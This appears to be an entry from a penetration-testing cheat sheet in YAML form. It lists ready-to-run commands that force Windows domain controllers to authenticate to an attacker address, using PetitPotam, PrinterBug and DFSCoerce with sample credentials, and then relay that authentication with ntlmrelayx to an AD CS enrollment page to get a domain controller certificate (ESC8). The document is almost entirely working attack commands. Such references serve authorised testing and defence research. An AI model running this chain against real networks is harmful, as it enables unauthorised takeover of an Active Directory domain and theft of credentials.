---
description: |
  Coerce Windows machines to authenticate to your machine using
  PetitPotam, PrinterBug, or DFSCoerce. Combine with NTLM relay.

  Reference values:
    Attacker IP: 10.10.14.1
    Target DC: 10.10.10.1
command: |
  # PetitPotam (unauthenticated coercion)
  python3 PetitPotam.py 10.10.14.1 10.10.10.1

  # PetitPotam (authenticated)
  python3 PetitPotam.py -u pentuser -p P@ssw0rd123 -d test.local 10.10.14.1 10.10.10.1

  # PrinterBug / SpoolSample
  python3 printerbug.py test.local/pentuser:P@ssw0rd123@10.10.10.1 10.10.14.1

  # DFSCoerce
  python3 dfscoerce.py -u pentuser -p P@ssw0rd123 -d test.local 10.10.14.1 10.10.10.1

  # Combine with ntlmrelayx to ADCS for ESC8
  impacket-ntlmrelayx -t http://ca.test.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
phase:
  - Exploitation
target_os:
  - Windows
services:
  - SMB
  - NTLM
items:
  - No_Creds
  - Username
  - Password
techniques:
  - NTLM_Relay_Poisoning
  - ADCS_Abuse
network_position:
  - Internal
references:
  - https://github.com/topotam/PetitPotam
  - https://github.com/Wh04m1001/DFSCoerce
---
